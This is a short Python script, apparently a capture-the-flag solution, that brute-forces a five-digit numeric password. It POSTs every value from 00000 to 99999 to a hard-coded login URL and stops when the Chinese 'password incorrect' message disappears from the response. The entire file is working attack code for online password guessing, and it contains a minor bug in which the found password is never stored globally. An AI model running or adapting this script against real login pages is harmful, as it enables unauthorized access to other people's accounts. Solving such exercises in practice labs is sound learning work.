import requests
import re


url = 'http://120.24.86.145:8002/baopo/?yes'
checkstr = '密码不正确'
result = ''


def passwordTest( str ):
    r = requests.post(url, data = {'pwd':str})
    r.encoding = 'utf-8'

    o = re.sub(r"<style[^<]+</style>", "", r.text)
    o = re.sub(r"<[^>]+>", "", o,re.UNICODE)
    o = re.sub(r"\s+","",o)

    #print(r.encoding)
    #print(r.text)

    #print(checkstr)

    #print(o)

    if re.search(checkstr,o) == None:
        print("成功")
        print(str)
        result = str
        return str
    else:  
        return None    

for i in range(0, 99999):
    str = '{:0>5d}'.format(i)
    print(str)
    if passwordTest(str) :
        break

print(result)   